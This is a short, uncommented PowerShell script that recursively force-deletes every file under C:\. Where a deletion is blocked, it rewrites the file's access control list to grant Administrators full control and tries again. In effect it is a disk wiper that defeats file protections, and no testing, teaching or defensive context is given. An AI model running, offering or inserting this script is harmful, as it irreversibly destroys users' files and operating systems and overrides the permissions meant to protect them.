$Path = "C:\"
$Files = Get-ChildItem $Path -Force -Recurse
foreach ($File in $Files) {
    try {
        Remove-Item -Path $File.FullName -Force -ErrorAction Stop
    }
    catch {
        $Acl = Get-Acl $File.FullName
        $Ar = New-Object System.Security.AccessControl.FileSystemAccessRule("Administrators","FullControl","Allow")
        $Acl.SetAccessRule($Ar)
        Set-Acl $File.FullName $Acl
        try {
            Remove-Item -Path $File.FullName -Force -ErrorAction Stop
        }
        catch {
            continue
        }
    }
}
